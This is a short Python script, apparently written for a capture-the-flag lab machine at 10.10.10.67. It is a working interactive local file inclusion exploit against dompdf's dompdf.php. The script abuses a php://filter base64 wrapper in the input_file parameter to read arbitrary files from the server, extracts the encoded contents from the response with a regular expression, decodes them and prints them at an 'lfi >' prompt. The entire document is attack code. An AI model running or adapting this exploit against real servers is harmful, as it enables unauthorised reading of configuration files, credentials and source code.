#!/usr/bin/python3


import requests
import sys
import signal
import time
import re
import base64

# ctrl + c
def signal_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# variables globales
main_url = "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/convert.base64-encode/resource="

# funciones
def lfi(file):

    path = main_url + file
    r = requests.get(path)
    patron = r'\[\((.*?)\)\]'
    coincidencias = re.findall(patron, r.text, re.DOTALL)
    
    if coincidencias:
        datos_base64 = coincidencias[0]
        datos_decodificados = base64.b64decode(datos_base64).decode("utf-8")
        return datos_decodificados
    else:
        return "No se encontraron datos en base64."


if __name__ == "__main__":
    
    file = ""

    while file != "exit":
        file = input("lfi > ")
        response = lfi(file)
        print(response)


